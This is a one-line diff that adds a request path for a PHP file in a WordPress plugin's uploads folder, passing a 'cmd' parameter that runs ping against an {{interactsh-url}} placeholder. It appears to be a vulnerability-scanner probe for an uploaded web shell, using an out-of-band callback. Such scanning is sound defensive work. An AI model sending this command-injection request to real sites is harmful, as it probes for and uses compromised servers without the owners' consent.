@@ -1,0 +1,1 @@
+/wp-content/plugins/import-xml-feed/uploads/169227090864de013cac47b.php?cmd=ping+{{interactsh-url}}
